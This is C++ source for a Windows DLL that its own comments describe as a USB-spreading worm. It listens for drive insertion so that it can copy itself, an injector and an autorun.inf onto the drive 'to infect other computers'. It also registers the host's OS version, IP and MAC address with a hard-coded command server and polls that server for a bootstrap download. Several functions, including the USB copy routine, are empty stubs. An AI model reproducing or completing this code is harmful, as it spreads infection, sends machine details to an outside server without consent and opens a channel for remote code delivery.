// private_dll.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include "private_dll.h"
#include <windows.h>
#include <stdio.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "proto.h"
#include <dbt.h>
#include "log.h"
#include <math.h>

#pragma warning(disable: 4996)
#pragma comment(lib, "Ws2_32.lib")

#define LOG_FILE  "dll_log.log"

#define SERVER_ADDR "171.1.2.13"
#define SERVER_PORT 4587

#define TCP_CLIENT_STATE_INIT  0
#define TCP_CLIENT_STATE_SEND_GET_REQ 1
#define TCP_CLIENT_STATE_RECV_GET_REP 2


typedef struct tcp_client_status
{
	SOCKET sock;
	int state;
}TCP_CLIENT_STATUS_T;


char host_exe_path_[512] = { 0 };
bool geted_host_exe_path_ = false;
HANDLE hLocalProcHandle_ = NULL;
HANDLE hUsbInsertEventHandle_ = NULL;
BOOL bQuit_ = FALSE;
int osVersion_ = 0;
BOOL isVistaLaterOS_ = FALSE;
TCP_CLIENT_STATUS_T tcp_client_status_ = { 0 };

void *loger_ = NULL;

/*1.Being used to listen usb event, when usb inserted into computer,
copy the files(private_dll.dll, inj.exe, autorun.inf) to usb.
and write an AutoRun.inf scripts into usb to infect other computers.
2. register to server
3. get command from server. maybe run the bootstrap.exe which is downloaded from the server
4. get the path of the programs from inj.exe*/
#define DLL_FILE "private_dll.dll"

/*inject dll into explorer.exe process and tell the dll the programs's path*/
#define INJ_FILE "inj.exe"

/*auto run the program . copy files(private_dll.dll, inj.exe) into compute's  partition of D and
register the inj.exe as an startup program with boot of the computer */
#define AUTO_RUN_INF "autorun.inf"





BOOL IsVistaOrLater()
{
	OSVERSIONINFO osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osvi);
	if (osvi.dwMajorVersion >= 6)
	{
		osVersion_ = osvi.dwMajorVersion;
		return TRUE;
	}
	return FALSE;
}

typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
LPFN_ISWOW64PROCESS fnIsWow64Process;

BOOL IsWow64()
{
	BOOL bIsWow64 = FALSE;
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
	if (NULL != fnIsWow64Process)
	{
		if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64))
		{
			return FALSE;
		}
	}
	return bIsWow64;
}



void InitNetwork()
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(2, 2);
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) {
		return;
	}

	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
		WSACleanup();
	}
	return;
}



unsigned __stdcall localProc(void* pArguments)
{
	

	SOCKET sockSrv = socket(AF_INET, SOCK_DGRAM, 0);

	SOCKADDR_IN  addrServ;
	addrServ.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrServ.sin_family = AF_INET;
	addrServ.sin_port = htons(UDP_SERVER_PORT);

	bind(sockSrv, (SOCKADDR*)&addrServ, sizeof(SOCKADDR));

	SOCKADDR_IN  addrClient = { 0 };
	int length = sizeof(SOCKADDR);
	char recvBuf[1024] = { 0 };
	int ret = 0;

	ret = recvfrom(sockSrv, recvBuf, 1024, 0, (SOCKADDR*)&addrClient, &length);
	LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)recvBuf;
	char *body = NULL;
	if (hdr->version == PROTO_VERSION && 
		hdr->msg_type == MSG_TYPE_BOOTSTRAP_LOCAL_PATH)
	{
		body = recvBuf + sizeof(LOCAL_PROTO_T);
		memcpy(host_exe_path_, body, hdr->msg_len);
		geted_host_exe_path_ = true;
	}
	closesocket(sockSrv);
	WSACleanup();
	return 0;
}

//copy programs into usb 
void copy_programs_to_usb(char usb)
{

}



LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM wp, LPARAM lp)
{
	if (msg == WM_DEVICECHANGE) {
		if ((DWORD)wp == DBT_DEVICEARRIVAL) {
			DEV_BROADCAST_VOLUME* p = (DEV_BROADCAST_VOLUME*)lp;
			if (p->dbcv_devicetype == DBT_DEVTYP_VOLUME) {
				int l = (int)(log(double(p->dbcv_unitmask)) / log(double(2)));
				log_write(loger_, "啊……%c盘插进来了\n", 'A' + l);
				copy_programs_to_usb(l + 'A');
			}
		}
		else if ((DWORD)wp == DBT_DEVICEREMOVECOMPLETE) {
			DEV_BROADCAST_VOLUME* p = (DEV_BROADCAST_VOLUME*)lp;
			if (p->dbcv_devicetype == DBT_DEVTYP_VOLUME) {
				int l = (int)(log(double(p->dbcv_unitmask)) / log(double(2)));
				log_write(loger_, "啊……%c盘被拔掉了\n", 'A' + l);
			}
		}
		return TRUE;
	}
	else return DefWindowProc(h, msg, wp, lp);
}


unsigned __stdcall usbEventProc(void* pArguments)
{
	WNDCLASS wc;
	ZeroMemory(&wc, sizeof(wc));
	wc.lpszClassName = TEXT("usb_listener");
	wc.lpfnWndProc = WndProc;

	RegisterClass(&wc);
	HWND h = CreateWindow(TEXT("usb_listener"), TEXT(""), 0, 0, 0, 0, 0,
		0, 0, GetModuleHandle(0), 0);
	MSG msg;
	while (GetMessage(&msg, 0, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

SOCKET create_local_streamsock_and_bind()
{
	int ret = 0;
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	SOCKADDR_IN  addrlocal;
	addrlocal.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrlocal.sin_family = AF_INET;
	addrlocal.sin_port = htons(0);

	ret = bind(sock, (SOCKADDR*)&addrlocal, sizeof(SOCKADDR));
	if (ret == SOCKET_ERROR){
		return 0;
	}
	return sock;
}

SOCKET create_local_datagramsock_and_bind()
{
	int ret = 0;
	SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
	SOCKADDR_IN  addrlocal;
	addrlocal.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrlocal.sin_family = AF_INET;
	addrlocal.sin_port = htons(0);

	ret = bind(sock, (SOCKADDR*)&addrlocal, sizeof(SOCKADDR));
	if (ret == SOCKET_ERROR){
		return 0;
	}
	return sock;
}

int get_os_version()
{
	return osVersion_;
}

int get_local_ipv4_addr()
{

}

char get_number_of_partition()
{

}

char *get_mac_address()
{

}


unsigned __stdcall registerProc(void* pArguments)
{
	int ret = 0;
	char buffer[512] = { 0 };
	int data_len = 0;
	char *body = NULL;
	char *ptr = NULL;
	int total_len = 0;

	SOCKET sock = create_local_datagramsock_and_bind();
	if (sock == 0)
	{
		return ret;
	}

	SOCKADDR_IN  addrServ;
	addrServ.sin_addr.S_un.S_addr = inet_addr(SERVER_ADDR);
	addrServ.sin_family = AF_INET;
	addrServ.sin_port = htons(SERVER_PORT);
	
	while (!bQuit_)
	{
		LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)buffer;
		hdr->version = PROTO_VERSION;
		hdr->msg_type = MSG_TYPE_REGISTER;
		hdr->body_len = 0;
		body = buffer + sizeof(LOCAL_PROTO_T);
		ptr = body;
		(*(int *)ptr) = get_os_version();
		ptr += sizeof(int);
		(*(int *)ptr) = get_local_ipv4_addr();
		ptr += sizeof(int);
		(*(char *)ptr) = get_number_of_partition();
		ptr += sizeof(char);
		memcpy(ptr, get_mac_address(), 6);
		ptr += 6;
		data_len = (int)(ptr - body);
		hdr->body_len = data_len;
		total_len = (int)(ptr - (char *)hdr);
		sendto(sock, buffer, total_len, 0, (sockaddr *)&addrServ, sizeof(addrServ));
		Sleep(1000 * 3000);//50 min
	}
	return 0;
}


unsigned __stdcall bootstrapProc(void* pArguments)
{
	int ret = 0;
	char buffer[512] = { 0 };
	FD_SET readSet;
	struct timeval timeout = { 0 };
	FD_ZERO(&readSet);

	SOCKET sock = create_local_streamsock_and_bind();
	if (sock == 0)
	{
		return ret;
	}
	while (!bQuit_)
	{
		if (tcp_client_status_.state == TCP_CLIENT_STATE_INIT)
		{
			SOCKADDR_IN  addrServ;
			addrServ.sin_addr.S_un.S_addr = inet_addr(SERVER_ADDR);
			addrServ.sin_family = AF_INET;
			addrServ.sin_port = htons(SERVER_PORT);
			//向服务器发出连接请求  
			if (connect(sock, (struct  sockaddr*)&addrServ, sizeof(addrServ)) == INVALID_SOCKET)
			{
				Sleep(1000 * 300);
				continue;
			}
		}
		LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)buffer;
		hdr->version = PROTO_VERSION;
		hdr->msg_type = MSG_TYPE_GET_BOOTSTRAP_VERSION;
		hdr->body_len = 0;
		ret = send(sock, buffer, sizeof(LOCAL_PROTO_T), 0);
		tcp_client_status_.state = TCP_CLIENT_STATE_SEND_GET_REQ;
		if (ret > 0)
		{
			timeout.tv_sec = 10;
			FD_SET(sock, &readSet);
			ret = select(0, &readSet, NULL, NULL, &timeout);
			if (ret > 0)
			{//read data
				FD_ZERO(&readSet);
				ret = recv(sock, buffer, sizeof(buffer), 0);
				if (ret > 0)
				{

				}
			}
			else if (ret == 0) //timeout
			{
				Sleep(1000 * 10);
				continue;
			}
			else //error
			{
				closesocket(sock);
				tcp_client_status_.state = TCP_CLIENT_STATE_INIT;
				Sleep(1000 * 300);
			}
		}
		else
		{
			closesocket(sock);
			tcp_client_status_.state = TCP_CLIENT_STATE_INIT;
			Sleep(1000 * 300);
		}
			
	}
		
}



void Init(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{

	loger_ = log_create(LOG_FILE);
	isVistaLaterOS_ = IsVistaOrLater();
	InitNetwork();
	//listen on localhost machine  for geting the path of inj.exe 
	unsigned threadID1, threadID2, threadID3;

	hLocalProcHandle_ = (HANDLE)_beginthreadex(NULL, 0, &localProc, NULL, 0, &threadID1);
	CloseHandle(hLocalProcHandle_);
	hLocalProcHandle_ = NULL;

	//listen usb insert event
	hUsbInsertEventHandle_ = (HANDLE)_beginthreadex(NULL, 0, &usbEventProc, NULL, 0, &threadID2);
	CloseHandle(hUsbInsertEventHandle_);
	hUsbInsertEventHandle_ = NULL;


	//network thread for comunicating with server
	HANDLE registerhandler;
	registerhandler = (HANDLE)_beginthreadex(NULL, 0, &registerProc, NULL, 0, &threadID3);
	CloseHandle(registerhandler);


	HANDLE bootstraphandler;
	bootstraphandler = (HANDLE)_beginthreadex(NULL, 0, &bootstrapProc, NULL, 0, &threadID3);
	CloseHandle(bootstraphandler);

	



}

void UnInit(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{

}